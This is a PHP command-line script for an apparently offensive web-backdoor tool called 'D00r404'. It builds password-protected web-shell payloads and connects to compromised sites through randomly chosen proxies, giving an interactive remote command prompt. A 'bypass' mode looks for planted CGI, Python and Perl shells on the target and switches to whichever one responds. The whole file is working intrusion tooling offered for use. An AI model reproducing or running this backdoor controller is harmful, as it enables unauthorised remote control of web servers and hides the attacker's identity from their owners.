<?php
$Pr = file_get_contents("proxyList.txt");
$Replace = array("a","b","c","d","e","f","g","!","h","j","k","l","m","n","i","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","-",",","_","+","=");
$Pr = str_replace($Replace,"",$Pr);
echo $Pr;
require("Files/includes/Functions.php");
$ScriptName = $argv[0];
if(!isset($argv[1])){
g : sysclear();
cEcho("","\e[97m");
echo "\n\n		USAGE : php $ScriptName -option \n";
cEcho("","\e[91m");
echo "-============================[";
cEcho("","\e[97m");
echo "BUILD PAYLOAD";
cEcho("","\e[91m");
echo "]============================- \n";
cEcho("","\e[97m");
echo "  COMMAND:[php $ScriptName -build -{type} PATH PASSWORD]  \n";
echo "	           types  :   \n";
echo "	           1-[-SC]   \n";
echo "	           2-[-SCA]   \n";
echo "	           3-[-JB]   \n";
echo "  EXAMPLE:[php $ScriptName -build -JB /home/USER/JB.php pass123]\n";
cEcho("","\e[91m");
echo "-============================[";
cEcho("","\e[97m");
echo "CONNECT";
cEcho("","\e[91m");
echo "]============================- \n";
cEcho("","\e[97m");
echo "  COMMAND:[php $ScriptName -{SC-SCA-JB}]  \n";
echo "		-SC  : Server Controller  \n";
echo "		-SCA  : Server Controller Advanced  \n";
echo "		-JB  : Jail break  \n";
echo "		-proxy  : use proxy list with connection  \n";
echo "  EXAMPLE:[php $ScriptName -JB -proxy proxyList.txt]\n";
exit();
}
if(isset($argv[2])){
	if(preg_match("/proxy/",$argv[2])){
$Proxy_List = $argv[3];
$Proxy_List = file_get_contents("$Proxy_List");
$Replace = array("a","b","c","d","e","f","g","!","h","j","k","l","m","n","i","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","-",",","_","+","=");
$Pr = str_replace($Replace,"",$Proxy_List);
$Pr = explode("\n",$Pr);
$counter = count($Pr);
$rand = rand(0,$counter);
$proxyW = $Pr[$rand];
$proxyW = explode(":",$proxyW);
$proxy_ip = $proxyW[0];
$proxy_port = $proxyW[1];
}
}else{
$proxy_ip = NULL;
$proxy_port = NULL;

}
require("Files/includes/Header.php");
echo _version();
echo $yellow;
$option = $argv[1];
$lenth = strlen($option);
if(preg_match("/-build/",$option)){
$type = $argv[2];
$path = $argv[3];
$pass = $argv[4];
if(preg_match("/-SCA/",$type)){
build("SCA",$path,$pass);
cEcho("\n	[+] You'r payload is ready now \n",$white);	
cEcho("\n	[+] password : $pass \n",$white);	
cEcho("\n	[+] path : $path \n",$white);	
exit();
}elseif(preg_match("/-SC/",$type)){
build("SC",$path,$pass);
cEcho("\n	[+] You'r payload is ready now \n",$white);	
cEcho("\n	[+] password : $pass \n",$white);	
cEcho("\n	[+] path : $path \n",$white);	
exit();
}elseif(preg_match("/-JB/",$type)){
build("JB",$path,$pass);
cEcho("\n	[+] You'r payload is ready now \n",$white);	
cEcho("\n	[+] password : $pass \n",$white);	
cEcho("\n	[+] path : $path \n",$white);	
exit();
}
}elseif($lenth < 4 AND preg_match("/-SC/",$option)){
$target = get_link();
$password = get_pass();
echo Get_Vers($argv[1],$target);
ChEcK_PaSS($target,$password);
sysclear();
while(true){
getCmd1 : echo "\n  $yellow<$red|D00r404$white$:$green";
$command = fgets(STDIN,1024);
$command = trim($command);
if(preg_match("/help/",$command)){
echo help_map("SC");
goto getCmd1;
}
echo simple_connect($target,$command,$password,$proxy_ip,$proxy_port);
}
}elseif($lenth < 5 AND preg_match("/-SCA/",$option)){
$target = get_link();
$password = get_pass();
echo Get_Vers($argv[1],$target);
ChEcK_PaSS($target,$password);
sysclear();
getPath : echo cEcho("  PATH ? : ",$yellow);
$PATH = fgets(STDIN,1024);
$PATH = trim($PATH);
while(true){
getCmd2 : echo "\n  $yellow<$red|D00r404$white$:$green";
$command = fgets(STDIN,1024);
$command = trim($command);
if(preg_match("/help/",$command)){
echo help_map("SCA");
goto getCmd2;
}
if(preg_match("/chPath/",$command)){
goto getPath;	
}
echo secend_connect($target,$command,$PATH,$proxy_ip,$proxy_port,$password);
}
}elseif(preg_match("/-JB/",$option)){
$target = get_link();
$password = get_pass();
echo Get_Vers($argv[1],$target);
ChEcK_PaSS($target,$password);
sysclear();
getPath2 : echo "   PATH ? : ";
$PATH = fgets(STDIN,1024);
$PATH = trim($PATH);
while(true){
getCmd : echo "\n  $yellow<$red|D00r404$white$:$green";
$command = fgets(STDIN,1024);
$command = trim($command);
if(preg_match("/help/",$command)){
echo help_map("JB");
goto getCmd;
}
if(preg_match("/chPath/",$command)){
goto getPath2;
}
if(preg_match("/bypass/",$command)){
$Domain = advansed_connect($target,$command,$PATH,$proxy_ip,$proxy_port,$password,$bYpass=true);
$Domain = trim($Domain);
$CgI = $Domain."/CgiSh3ll/izo.cin";
$CgI_HdR = @get_headers("$CgI");
if(!preg_match("/OK/",$CgI_HdR[0])){
$CgI = NULL;	
}
$PyT = $Domain."/PySh3ll/python.izo";
$PyT_HdR = @get_headers("$PyT");
if(!preg_match("/OK/",$PyT_HdR[0])){
$PyT = NULL;	
}
$PeL = $Domain."/PlSh3ll/WhoCares.pl";
$PeL_HdR = @get_headers("$PeL");
if(!preg_match("/OK/",$PeL_HdR[0])){
$PeL = NULL;	
}
while(true){
if($PyT == NULL AND $CgI == NULL AND $PeL == NULL){
cEcho("  [-] Err can't use perl,cgi and python shell\n\n",$red);
exit();
} 
if($PyT != NULL){
PyT : echo "\n  $yellow<$red|D00r404$white$.python:$green";
$command = fgets(STDIN,1024);
$command = trim($command);
python_shell("$PyT","$command",$proxy_ip,$proxy_port);
goto PyT;
}
if($CgI != NULL){
CgI : echo "\n  $yellow<$red|D00r404$white$.CGI:$green";
$command = fgets(STDIN,1024);
$command = trim($command);
cgi_perl_shell("$CgI","$command",$proxy_ip,$proxy_port);
goto CgI;
}

if($PeL != NULL){
PeL : echo "\n  $yellow<$red|D00r404$white$.perl:$green";
$command = fgets(STDIN,1024);
$command = trim($command);
cgi_perl_shell("$PeL","$command",$proxy_ip,$proxy_port);
goto PeL;
}

	
}
}
echo advansed_connect($target,$command,$PATH,$proxy_ip,$proxy_port,$password,$bYpass=false);
}
}else{
goto g;	
}
?>
